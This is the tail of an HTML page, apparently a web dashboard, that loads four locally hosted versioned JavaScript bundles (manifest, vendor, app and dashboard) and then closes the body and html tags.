                <script src="./js/manifest.js?id=7db827d654313dce4250"></script>
                <script src="./js/vendor.js?id=0089ae30037219bb2aca"></script>
                <script src="./js/app.js?id=a3b3925bfcb5e3733680"></script>
                <script src="./js/dashboard.js?id=144a7bb8a2d60960f12e"></script>



            </body>

            </html>